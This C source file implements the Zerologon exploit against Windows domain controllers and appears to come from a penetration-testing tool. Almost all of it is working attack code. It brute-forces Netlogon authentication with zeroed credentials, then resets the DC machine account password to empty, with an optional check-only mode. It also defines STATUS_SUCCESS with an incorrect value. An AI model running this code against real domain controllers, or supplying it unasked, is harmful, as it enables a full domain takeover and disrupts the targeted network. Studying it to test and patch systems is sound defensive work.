#include <Windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "NetLogon.h"
#include "ZeroLogon.h"



// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
#define STATUS_SUCCESS				0xC0000000
#define RPC_NT_SERVER_UNAVAILABLE	0xC0020017
#define STATUS_ACCESS_DENIED		0xC0000022
// //#include <ntstatus.h>

#define NT_SUCCESS(Status)		((NTSTATUS)(Status) >= 0x00000000 && (NTSTATUS)(Status) <= 0x3FFFFFFF)
#define NT_INFORMATION(Status)	((NTSTATUS)(Status) >= 0x40000000 && (NTSTATUS)(Status) <= 0x7FFFFFFF)
#define NT_WARNING(Status)		((NTSTATUS)(Status) >= 0x80000000 && (NTSTATUS)(Status) <= 0xBFFFFFFF)
#define NT_ERROR(Status)		((NTSTATUS)(Status) >= 0xC0000000 && (NTSTATUS)(Status) <= 0xFFFFFFFF)



BOOL SetPassword(NetLogonAPI netLogonApi, WCHAR* dc_fqdn, WCHAR* dc_netbios, WCHAR* dc_account) {
	NETLOGON_AUTHENTICATOR Auth = { 0 };
	NETLOGON_AUTHENTICATOR AuthRet = { 0 };
	NL_TRUST_PASSWORD      NewPass = { 0 };

	if (netLogonApi.NetServerPasswordSet2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &Auth, &AuthRet, &NewPass) == 0) {
		printf("\t[*] Success! Password of %S set to: '31d6cfe0d16ae931b73c59d7e0c089c0' !\n", dc_account);
		return TRUE;
	}else {
		printf("[x] Failed to set machine account pass for %S\n", dc_account);
	}
	return FALSE;
}

BOOL LoadNetLogonAPI(NetLogonAPI* pNetLogonAPI) {
	HMODULE netapi32 = LoadLibraryA("netapi32.dll");
	if (netapi32 == NULL) {
		printf("[x] Fail netapi32 == NULL !\n");
		return FALSE;
	}
	pNetLogonAPI->NetServerReqChallenge = (_I_NetServerReqChallenge)GetProcAddress(netapi32, "I_NetServerReqChallenge");
	pNetLogonAPI->NetServerAuthenticate2 = (_I_NetServerAuthenticate2)GetProcAddress(netapi32, "I_NetServerAuthenticate2");
	pNetLogonAPI->NetServerPasswordSet2 = (_I_NetServerPasswordSet2)GetProcAddress(netapi32, "I_NetServerPasswordSet2");

	if (pNetLogonAPI->NetServerReqChallenge == NULL || pNetLogonAPI->NetServerAuthenticate2 == NULL || pNetLogonAPI->NetServerPasswordSet2 == NULL) {
		printf("[x] Fail to GetProcAddress return NULL !\n");
		return FALSE;
	}
	return TRUE;
}


BOOL RunZeroLogon(WCHAR* dc_fqdn, WCHAR* dc_netbios, WCHAR* dc_account, BOOL isOnlyCheck) {
	DWORD                  i;
	NETLOGON_CREDENTIAL    ClientCh = { 0 };
	NETLOGON_CREDENTIAL    ServerCh = { 0 };
	ULONG                  NegotiateFlags = 0x212fffff;
	NetLogonAPI netLogonApi;

	if (!LoadNetLogonAPI(&netLogonApi)) 
		return FALSE;

	for (i = 0; i < 2000; i++) {
		NTSTATUS retReqChall = netLogonApi.NetServerReqChallenge(dc_fqdn, dc_netbios, &ClientCh, &ServerCh);
		if (NT_SUCCESS(retReqChall)) {
			if ((netLogonApi.NetServerAuthenticate2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &ClientCh, &ServerCh, &NegotiateFlags) == 0)) {
				printf("\t[i] %S is vurlnerable to Zerologon\n", dc_fqdn);

				if (!isOnlyCheck)
					return SetPassword(netLogonApi, dc_fqdn, dc_netbios, dc_account);
				return TRUE;
			}
		}else if (NT_ERROR(retReqChall)) {
			switch (retReqChall){
			case RPC_NT_SERVER_UNAVAILABLE:
				printf("\t[x] The RPC server is unavailable.\n");
				return FALSE;
			case STATUS_ACCESS_DENIED:
				printf("\t[%i/2000] Access Denied\r", i + 1);
				break;
			default:
				printf("\t[x] Unable to complete server challenge (%x).\n", retReqChall);
				printf("\t[x] Possible invalid name or network issues ?\n");
				return FALSE;
			}
		}else if (NT_INFORMATION(retReqChall)) {
			printf("\t[i] NetServerReqChallenge return information code: %x !\n", retReqChall);
			return FALSE;
		}else if (NT_WARNING(retReqChall)) {
			printf("\t[w] NetServerReqChallenge return warning code: %x !\n", retReqChall);
			return FALSE;
		}
	}
	printf("\n\t[x] %S is not vulnerable !\n", dc_fqdn);
	return FALSE;
}

BOOL GetComputerNameFQDL(WCHAR* dc_netbios, WCHAR** ppDcAccount) {
	size_t dcAccountSize = wcslen(dc_netbios) + 2;
	*ppDcAccount = (WCHAR*)calloc(dcAccountSize, sizeof(WCHAR));
	if (*ppDcAccount == NULL) {
		printf("\t[x] Fail to allocate memory !\n");
		return FALSE;
	}
	
	swprintf_s(*ppDcAccount, dcAccountSize, L"%s$", dc_netbios);
	return TRUE;
}

BOOL ZeroLogon(ExploitZeroLogon exploitZeroLogon){
	printf("[-] Zero Logon Exploit\n");
	WCHAR* dc_account;

	if (GetComputerNameFQDL(exploitZeroLogon.computerName, &dc_account)) {
		BOOL result;
		// RunZeroLogon(L"DC1.pentest.local", L"DC1", L"DC1$",1);
		result = RunZeroLogon(exploitZeroLogon.serverFQDN, exploitZeroLogon.computerName, dc_account, exploitZeroLogon.isOnlyCheck);
		free(dc_account);
		return result;
	}
	return FALSE;
}